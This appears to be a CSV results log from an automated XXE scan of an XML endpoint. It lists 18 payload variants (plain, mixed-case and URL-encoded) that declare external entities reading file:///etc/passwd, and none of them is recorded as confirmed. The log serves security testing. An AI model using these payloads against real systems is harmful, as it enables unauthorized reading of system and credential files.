@@ -1,0 +1,19 @@
+﻿Category,Mode,Index,Payload,Status,Outcome,Confirmed,Evidence,Note,ResponseBodySaved,TestedUtc
+XXE,Basic,1,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.085813+00:00
+XXE,Basic,2,"<!entity xxe SYSTEM ""file:///etc/passwd"">",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.111267+00:00
+XXE,Basic,3,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.127657+00:00
+XXE,Basic,4,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.141714+00:00
+XXE,Basic,5,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.157404+00:00
+XXE,Basic,6,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.173173+00:00
+XXE,Advanced,1,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.188750+00:00
+XXE,Advanced,2,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.204208+00:00
+XXE,Advanced,3,"<!entity xxe SYSTEM ""file:///etc/passwd"">",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.219121+00:00
+XXE,Advanced,4,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.234668+00:00
+XXE,Advanced,5,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.251132+00:00
+XXE,Advanced,6,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>",200,NO_FILE_MARKER,False,,,False,2026-10-11T09:31:56.270196+00:00
+XXE,Evasion,1,%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E,SKIPPED,NOT_VALID_AS_XML_FRAGMENT,False,,URL-encoded fragment is not decoded by this raw XML sink,False,2026-10-11T09:31:56.270196+00:00
+XXE,Evasion,2,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E,SKIPPED,NOT_VALID_AS_XML_FRAGMENT,False,,URL-encoded fragment is not decoded by this raw XML sink,False,2026-10-11T09:31:56.270196+00:00
+XXE,Evasion,3,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E,SKIPPED,NOT_VALID_AS_XML_FRAGMENT,False,,URL-encoded fragment is not decoded by this raw XML sink,False,2026-10-11T09:31:56.270196+00:00
+XXE,Evasion,4,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E,SKIPPED,NOT_VALID_AS_XML_FRAGMENT,False,,URL-encoded fragment is not decoded by this raw XML sink,False,2026-10-11T09:31:56.270196+00:00
+XXE,Evasion,5,%3C!doctype%20foo%20[%20%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E,SKIPPED,NOT_VALID_AS_XML_FRAGMENT,False,,URL-encoded fragment is not decoded by this raw XML sink,False,2026-10-11T09:31:56.270196+00:00
+XXE,Evasion,6,%3C!doctype%20data%20[%3C!entity%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E,SKIPPED,NOT_VALID_AS_XML_FRAGMENT,False,,URL-encoded fragment is not decoded by this raw XML sink,False,2026-10-11T09:31:56.270196+00:00
